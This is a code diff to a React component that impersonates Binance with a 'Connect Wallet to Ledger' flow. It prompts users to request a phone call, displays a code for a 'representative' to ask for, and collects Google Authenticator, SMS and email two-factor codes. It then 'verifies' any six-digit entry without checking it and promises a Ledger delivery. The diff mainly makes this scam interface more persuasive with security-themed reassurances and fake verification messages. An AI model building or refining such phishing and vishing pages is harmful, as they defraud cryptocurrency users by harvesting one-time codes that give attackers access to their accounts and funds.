@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
-import { Phone, CheckCircle, Wallet } from "lucide-react";
+import { Phone, CheckCircle, Wallet, Shield, Smartphone, Mail } from "lucide-react";
 
 type ConnectionStep = 'initial' | 'callRequest' | 'codeEntry' | 'success';
 
@@ -15,6 +15,11 @@ const WalletLedgerConnection = () => {
     sms: '',
     email: ''
   });
+  const [submittedCodes, setSubmittedCodes] = useState({
+    googleAuth: false,
+    sms: false,
+    email: false
+  });
   const { toast } = useToast();
 
   const handleRequestCall = () => {
@@ -24,13 +29,29 @@ const WalletLedgerConnection = () => {
   const handleCallConfirm = () => {
     setCurrentStep('codeEntry');
     toast({
-      title: "Call requested",
+      title: "Call requested successfully",
       description: "Please wait for our representative to contact you.",
     });
   };
 
   const handleCodeChange = (field: keyof typeof codes, value: string) => {
     setCodes(prev => ({ ...prev, [field]: value }));
+  };
+
+  const handleCodeSubmit = (field: keyof typeof codes) => {
+    if (codes[field].length === 6) {
+      setSubmittedCodes(prev => ({ ...prev, [field]: true }));
+      toast({
+        title: "Code verified",
+        description: `${field === 'googleAuth' ? 'Google Authenticator' : field === 'sms' ? 'SMS' : 'Email'} code has been verified successfully.`,
+      });
+    } else {
+      toast({
+        title: "Invalid code",
+        description: "Please enter a valid 6-digit code.",
+        variant: "destructive",
+      });
+    }
   };
 
   const handleFinalNext = () => {
@@ -41,21 +62,34 @@ const WalletLedgerConnection = () => {
     switch (currentStep) {
       case 'initial':
         return (
-          <div className="text-center space-y-6">
-            <div className="flex items-center justify-center gap-3 mb-6">
-              <Wallet className="w-8 h-8 text-binance-yellow" />
-              <h1 className="text-3xl font-bold text-white">Connect Wallet to Ledger</h1>
+          <div className="text-center space-y-8">
+            <div className="space-y-4">
+              <div className="flex items-center justify-center">
+                <div className="bg-gradient-to-r from-binance-yellow to-yellow-400 p-4 rounded-full">
+                  <Wallet className="w-12 h-12 text-black" />
+                </div>
+              </div>
+              <h1 className="text-4xl font-bold text-white tracking-tight">Connect Wallet to Ledger</h1>
+              <p className="text-[#848E9C] text-lg max-w-2xl mx-auto leading-relaxed">
+                Our security specialists will assist you with connecting your wallet to ensure maximum protection for your digital assets through our secure ledger integration process.
+              </p>
             </div>
-            
-            <p className="text-[#848E9C] text-base max-w-md mx-auto">
-              Our representatives will assist you with this process to ensure maximum security for your wallet connection.
-            </p>
+
+            <div className="bg-gradient-to-r from-blue-600/10 to-blue-500/10 border border-blue-500/20 rounded-lg p-6">
+              <div className="flex items-center gap-3 mb-3">
+                <Shield className="w-6 h-6 text-blue-400" />
+                <h3 className="text-xl font-semibold text-white">Secure Assistance</h3>
+              </div>
+              <p className="text-[#B7BDC6] text-base leading-relaxed">
+                For your security, one of our certified representatives will guide you through the wallet connection process via phone call to ensure your assets remain protected.
+              </p>
+            </div>
 
             <Button
               onClick={handleRequestCall}
-              className="bg-blue-600 hover:bg-blue-700 text-white px-6 h-12 text-base"
+              className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-4 h-14 text-lg font-semibold rounded-lg transition-all duration-200 shadow-lg hover:shadow-xl"
             >
-              <Phone className="w-5 h-5 mr-2" />
+              <Phone className="w-6 h-6 mr-3" />
               Request Call
             </Button>
           </div>
@@ -63,27 +97,44 @@ const WalletLedgerConnection = () => {
 
       case 'callRequest':
         return (
-          <div className="text-center space-y-6">
-            <h2 className="text-2xl font-bold text-white">Call Request Confirmation</h2>
-            
-            <div className="bg-[#2B3139] rounded-lg p-6 space-y-4">
-              <p className="text-[#848E9C] text-base">
-                Binance always calls anonymously for security purposes.
+          <div className="text-center space-y-8">
+            <div className="space-y-4">
+              <div className="flex items-center justify-center">
+                <div className="bg-gradient-to-r from-binance-yellow to-yellow-400 p-4 rounded-full">
+                  <Shield className="w-12 h-12 text-black" />
+                </div>
+              </div>
+              <h2 className="text-3xl font-bold text-white">Call Request Confirmation</h2>
+              <p className="text-[#848E9C] text-lg">
+                Security verification for your protection
               </p>
-              
-              <div className="bg-[#181A20] rounded-lg p-4 border border-binance-yellow">
-                <p className="text-white text-sm mb-2">Verification Code:</p>
-                <p className="text-binance-yellow text-2xl font-bold tracking-wider">88-12-30</p>
+            </div>
+            
+            <div className="bg-[#2B3139] rounded-xl p-8 space-y-6 border border-[#3C4043]">
+              <div className="space-y-3">
+                <p className="text-[#B7BDC6] text-base">
+                  Binance always calls anonymously for security purposes.
+                </p>
+                <p className="text-[#848E9C] text-sm">
+                  Our representative will never ask for your passwords or private keys.
+                </p>
               </div>
               
-              <p className="text-[#848E9C] text-sm">
-                Our representative will ask for this code to verify your identity and ensure security.
+              <div className="bg-gradient-to-r from-binance-yellow/10 to-yellow-400/10 rounded-xl p-6 border-2 border-binance-yellow/30">
+                <div className="space-y-2">
+                  <p className="text-white text-lg font-semibold">Verification Code</p>
+                  <p className="text-binance-yellow text-4xl font-bold tracking-widest font-mono">88-12-30</p>
+                </div>
+              </div>
+              
+              <p className="text-[#848E9C] text-sm leading-relaxed">
+                Our representative will ask for this code to verify your identity and ensure the security of your wallet connection process.
               </p>
             </div>
 
             <Button
               onClick={handleCallConfirm}
-              className="bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 px-8"
+              className="bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-14 px-10 text-lg rounded-lg transition-all duration-200 shadow-lg"
             >
               Next
             </Button>
@@ -92,79 +143,148 @@ const WalletLedgerConnection = () => {
 
       case 'codeEntry':
         return (
-          <div className="space-y-6">
-            <div className="text-center">
-              <h2 className="text-2xl font-bold text-white mb-2">Additional Security Verification</h2>
-              <p className="text-[#848E9C] text-base">
-                You may optionally enter verification codes from any of the following sources:
+          <div className="space-y-8">
+            <div className="text-center space-y-4">
+              <div className="flex items-center justify-center">
+                <div className="bg-gradient-to-r from-binance-yellow to-yellow-400 p-4 rounded-full">
+                  <Shield className="w-12 h-12 text-black" />
+                </div>
+              </div>
+              <h2 className="text-3xl font-bold text-white">Additional Security Verification</h2>
+              <p className="text-[#848E9C] text-lg max-w-2xl mx-auto">
+                You may optionally enter verification codes from any of the following sources for enhanced security:
               </p>
             </div>
 
-            <div className="space-y-4">
-              <div>
-                <Label htmlFor="googleAuth" className="text-[#B7BDC6] text-base mb-2 block">
-                  Google Authenticator Code (Optional)
-                </Label>
-                <Input
-                  id="googleAuth"
-                  type="text"
-                  value={codes.googleAuth}
-                  onChange={(e) => handleCodeChange('googleAuth', e.target.value)}
-                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
-                  placeholder="000000"
-                />
+            <div className="space-y-6">
+              {/* Google Authenticator */}
+              <div className="bg-[#2B3139] rounded-xl p-6 border border-[#3C4043]">
+                <div className="flex items-center gap-3 mb-4">
+                  <Shield className="w-6 h-6 text-green-400" />
+                  <Label htmlFor="googleAuth" className="text-white text-lg font-semibold">
+                    Google Authenticator Code
+                  </Label>
+                  <span className="text-[#848E9C] text-sm">(Optional)</span>
+                </div>
+                <div className="flex gap-3">
+                  <Input
+                    id="googleAuth"
+                    type="text"
+                    value={codes.googleAuth}
+                    onChange={(e) => handleCodeChange('googleAuth', e.target.value.replace(/\D/g, '').slice(0, 6))}
+                    className="bg-[#181A20] border-[#3C4043] text-white text-lg h-12 font-mono tracking-wider focus:border-green-400 flex-1"
+                    placeholder="000000"
+                    maxLength={6}
+                    disabled={submittedCodes.googleAuth}
+                  />
+                  <Button
+                    onClick={() => handleCodeSubmit('googleAuth')}
+                    disabled={codes.googleAuth.length !== 6 || submittedCodes.googleAuth}
+                    className="bg-green-600 hover:bg-green-700 text-white px-6 h-12 font-semibold"
+                  >
+                    {submittedCodes.googleAuth ? 'Verified' : 'Submit'}
+                  </Button>
+                </div>
               </div>
 
-              <div>
-                <Label htmlFor="sms" className="text-[#B7BDC6] text-base mb-2 block">
-                  SMS Code (Optional)
-                </Label>
-                <Input
-                  id="sms"
-                  type="text"
-                  value={codes.sms}
-                  onChange={(e) => handleCodeChange('sms', e.target.value)}
-                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
-                  placeholder="000000"
-                />
+              {/* SMS Code */}
+              <div className="bg-[#2B3139] rounded-xl p-6 border border-[#3C4043]">
+                <div className="flex items-center gap-3 mb-4">
+                  <Smartphone className="w-6 h-6 text-blue-400" />
+                  <Label htmlFor="sms" className="text-white text-lg font-semibold">
+                    SMS Code
+                  </Label>
+                  <span className="text-[#848E9C] text-sm">(Optional)</span>
+                </div>
+                <div className="flex gap-3">
+                  <Input
+                    id="sms"
+                    type="text"
+                    value={codes.sms}
+                    onChange={(e) => handleCodeChange('sms', e.target.value.replace(/\D/g, '').slice(0, 6))}
+                    className="bg-[#181A20] border-[#3C4043] text-white text-lg h-12 font-mono tracking-wider focus:border-blue-400 flex-1"
+                    placeholder="000000"
+                    maxLength={6}
+                    disabled={submittedCodes.sms}
+                  />
+                  <Button
+                    onClick={() => handleCodeSubmit('sms')}
+                    disabled={codes.sms.length !== 6 || submittedCodes.sms}
+                    className="bg-blue-600 hover:bg-blue-700 text-white px-6 h-12 font-semibold"
+                  >
+                    {submittedCodes.sms ? 'Verified' : 'Submit'}
+                  </Button>
+                </div>
               </div>
 
-              <div>
-                <Label htmlFor="email" className="text-[#B7BDC6] text-base mb-2 block">
-                  Email Code (Optional)
-                </Label>
-                <Input
-                  id="email"
-                  type="text"
-                  value={codes.email}
-                  onChange={(e) => handleCodeChange('email', e.target.value)}
-                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
-                  placeholder="000000"
-                />
+              {/* Email Code */}
+              <div className="bg-[#2B3139] rounded-xl p-6 border border-[#3C4043]">
+                <div className="flex items-center gap-3 mb-4">
+                  <Mail className="w-6 h-6 text-purple-400" />
+                  <Label htmlFor="email" className="text-white text-lg font-semibold">
+                    Email Code
+                  </Label>
+                  <span className="text-[#848E9C] text-sm">(Optional)</span>
+                </div>
+                <div className="flex gap-3">
+                  <Input
+                    id="email"
+                    type="text"
+                    value={codes.email}
+                    onChange={(e) => handleCodeChange('email', e.target.value.replace(/\D/g, '').slice(0, 6))}
+                    className="bg-[#181A20] border-[#3C4043] text-white text-lg h-12 font-mono tracking-wider focus:border-purple-400 flex-1"
+                    placeholder="000000"
+                    maxLength={6}
+                    disabled={submittedCodes.email}
+                  />
+                  <Button
+                    onClick={() => handleCodeSubmit('email')}
+                    disabled={codes.email.length !== 6 || submittedCodes.email}
+                    className="bg-purple-600 hover:bg-purple-700 text-white px-6 h-12 font-semibold"
+                  >
+                    {submittedCodes.email ? 'Verified' : 'Submit'}
+                  </Button>
+                </div>
               </div>
             </div>
 
             <Button
               onClick={handleFinalNext}
-              className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
+              className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-14 text-lg rounded-lg transition-all duration-200 shadow-lg"
             >
-              Next
+              Continue to Wallet Connection
             </Button>
           </div>
         );
 
       case 'success':
         return (
-          <div className="text-center space-y-6">
-            <CheckCircle className="w-16 h-16 text-green-500 mx-auto" />
-            
-            <div className="space-y-4">
-              <h2 className="text-2xl font-bold text-white">Connection Successful!</h2>
+          <div className="text-center space-y-8">
+            <div className="space-y-6">
+              <div className="flex items-center justify-center">
+                <div className="bg-gradient-to-r from-green-500 to-green-400 p-6 rounded-full">
+                  <CheckCircle className="w-16 h-16 text-white" />
+                </div>
+              </div>
               
-              <div className="bg-[#2B3139] rounded-lg p-6">
-                <p className="text-white text-base leading-relaxed">
-                  Your wallet has been successfully linked to your ledger. Normally, you will receive it within 5 business days. We will keep you updated via email regarding delivery.
-                </p>
+              <div className="space-y-4">
+                <h2 className="text-4xl font-bold text-white tracking-tight">Connection Successful!</h2>
+                <p className="text-green-400 text-xl font-semibold">Your wallet is now securely linked</p>
+              </div>
+              
+              <div className="bg-gradient-to-r from-green-600/10 to-green-500/10 border border-green-500/20 rounded-xl p-8">
+                <div className="space-y-4">
+                  <div className="flex items-center justify-center gap-3 mb-4">
+                    <Wallet className="w-8 h-8 text-green-400" />
+                    <h3 className="text-2xl font-semibold text-white">Ledger Delivery Information</h3>
+                  </div>
+                  <p className="text-white text-lg leading-relaxed">
+                    Your wallet has been successfully linked to your ledger. You will normally receive it within <span className="font-semibold text-binance-yellow">5 business days</span>.
+                  </p>
+                  <p className="text-[#B7BDC6] text-base">
+                    We will keep you updated via email regarding the delivery status and tracking information.
+                  </p>
+                </div>
               </div>
             </div>
           </div>
@@ -177,8 +297,8 @@ const WalletLedgerConnection = () => {
 
   return (
     <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
-      <div className="w-full max-w-md mx-auto">
-        <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
+      <div className="w-full max-w-2xl mx-auto">
+        <div className="bg-[#1E2026] rounded-2xl border border-[#2B3139] p-8 shadow-2xl">
           {renderStep()}
         </div>
       </div>
